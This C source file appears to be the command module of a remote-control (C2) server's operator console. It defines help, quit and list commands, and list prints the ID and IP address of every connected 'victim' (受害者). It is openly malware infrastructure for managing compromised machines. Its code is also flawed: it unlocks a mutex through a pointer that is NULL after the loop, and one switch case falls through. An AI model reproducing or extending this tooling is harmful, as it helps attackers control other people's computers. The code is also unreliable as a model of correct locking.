//
// Created by cmtheit on 23-6-1.
//

#include "cmd.h"
#include "session.h"
#include "server.h"
#include "victim.h"
#include <protocol/protocol.h>
#include <lib/util.h>
#include <arpa/inet.h>

Cmd cmds[CMD_NUM];

static void on_cmd_help();      // help 命令
static void on_cmd_quit();      // quit 命令
static void on_cmd_list();      // list 命令
static void on_cmd_undefined(); // 其他命令

CmdInitResult cmd_init() {
    CmdInitResult res = result_new_ok(0);
    memset(&cmds, 0, sizeof(cmds));
    hevent_t ev;
    for (int i = 0; i < CMD_NUM; ++i) {
        hevent_t * ev = &cmds[i].ev;
        memset(ev, 0, sizeof(hevent_t));
        ev->event_type = (hevent_type_e)(HEVENT_TYPE_CUSTOM + 1);
        switch (i) {
            case CMD_HELP_ID:
                ev->cb = on_cmd_help;
                cmds[i].name = "help";
                cmds[i].description = "输出帮助信息";
                break;
            case CMD_QUIT_ID:
                ev->cb = on_cmd_quit;
                cmds[i].name = "quit";
                cmds[i].description = "关闭连接并退出";
                break;
            case CMD_LIST_ID:
                ev->cb = on_cmd_list;
                cmds[i].name = "list";
                cmds[i].description = "列出所有当前受害者的连接";
                break;
            case CMD_undefined_ID:
                ev->cb = on_cmd_undefined;
                cmds[i].name = "(其他)";
                cmds[i].description = "无效的命令";
            default:
                break;
        }
    }
    ev.cb = on_cmd_help;
    return res;
}

void cmd_exe(const char * name, int argc, char ** argv) {
    for (int i = 0; i < CMD_NUM; ++i) {
        if (!strcmp(name, cmds[i].name) || i == CMD_NUM - 1) {
            switch (i) {

            }
            hloop_post_event(server.m.hloop, &cmds[i].ev);
            return;
        }
    }
}

static void on_cmd_help() {
    hio_write_str(session.io, "以下是所有命令：\n");
    for (int i = 0; i < CMD_NUM; ++i) {
        const char * msg = "\t";
        hio_write_str(session.io, msg);
        msg = cmds[i].name;
        hio_write_str(session.io, msg);
        msg = "\t";
        hio_write_str(session.io, msg);
        msg = cmds[i].description;
        hio_write_str(session.io, msg);
        hio_write_str(session.io, "\n");
    }
    server_write_msg(session.io, "");
}

static void on_cmd_list() {
    Victim * p = victims;
    if (p) {
        pthread_mutex_lock(&p->lock);
        hio_write_str(session.io, "id   ip地址\n");
        char buffer[5 + INET_ADDRSTRLEN] = {0};
        char ip_buf[INET_ADDRSTRLEN] = {0};
        while (p) {
            struct sockaddr * addr = hio_peeraddr(p->io);
            inet_ntop(AF_INET, addr, ip_buf, INET_ADDRSTRLEN);
            sprintf(buffer, "%-5d%-14s\n", p->id, ip_buf);
            hio_write_str(session.io, buffer);
            p = p->next;
        }
        pthread_mutex_unlock(&p->lock);
        server_write_msg(session.io, "");
    } else {
        server_write_msg(session.io, "当前暂无受害者");
    }
}

static void on_cmd_quit() {
    session_unestablish();
}

static void on_cmd_undefined() {
    server_write_msg(session.io, "无效的命令");
}
